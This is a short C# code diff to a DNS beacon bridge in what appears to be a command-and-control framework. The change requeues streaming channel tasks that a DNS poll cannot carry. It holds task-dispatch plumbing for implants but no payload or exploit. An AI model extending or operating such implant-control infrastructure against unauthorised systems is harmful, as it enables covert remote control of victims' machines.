@@ -68,8 +68,9 @@ internal sealed class DnsBeaconBridge
     /// <summary>
     /// One poll: refreshes the implant's presence and hands back the next
     /// queued task as marshaled, signed TaskRequest bytes -- or null when
-    /// there is nothing to send (no live session, empty queue, or a task too
-    /// large for the DNS budget, which is requeued for a stream transport).
+    /// there is nothing to send (no live session, empty queue, a channel task
+    /// only a stream can run, or a task too large for the DNS budget; the
+    /// latter two are requeued for a stream transport).
     /// </summary>
     public async Task<byte[]?> PollAsync(ImplantId implant, CancellationToken cancellationToken)
     {
@@ -87,6 +88,18 @@ internal sealed class DnsBeaconBridge
         var dispatched = await _tasks.DispatchNextAsync(implant, cancellationToken);
         if (dispatched is null)
             return null;
+
+        // A streaming task is a channel on the beacon stream that carried it
+        // (architecture.md Sec 10.3): its input rides ChannelInput frames and
+        // its output streams back as ChannelOutput. A datagram poll has no
+        // stream to run a channel on, so a channel task is requeued untouched
+        // for a stream transport to claim -- the same handback an oversized
+        // task gets below.
+        if (ChannelVerbs.IsChannelVerb(dispatched.Verb))
+        {
+            await _tasks.RequeueAsync(dispatched.TaskId, CancellationToken.None);
+            return null;
+        }
 
         var request = new TaskRequest
         {
